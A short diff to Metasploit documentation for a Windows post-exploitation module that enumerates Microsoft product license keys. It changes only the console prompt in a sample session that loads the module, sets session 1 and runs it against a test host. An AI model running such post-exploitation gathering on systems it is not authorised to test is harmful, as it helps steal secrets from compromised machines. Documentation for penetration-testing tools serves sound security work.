@@ -17,10 +17,10 @@ This module will enumerate Microsoft product license keys.
 ### Windows 7 Professional SP1 (x64)
 
 ```
-msf6 > use post/windows/gather/enum_ms_product_keys
-msf6 post(windows/gather/enum_ms_product_keys) > set session 1
+msf > use post/windows/gather/enum_ms_product_keys
+msf post(windows/gather/enum_ms_product_keys) > set session 1
 session => 1
-msf6 post(windows/gather/enum_ms_product_keys) > run
+msf post(windows/gather/enum_ms_product_keys) > run
 
 [*] Finding Microsoft product keys on TEST (192.168.200.190)
 
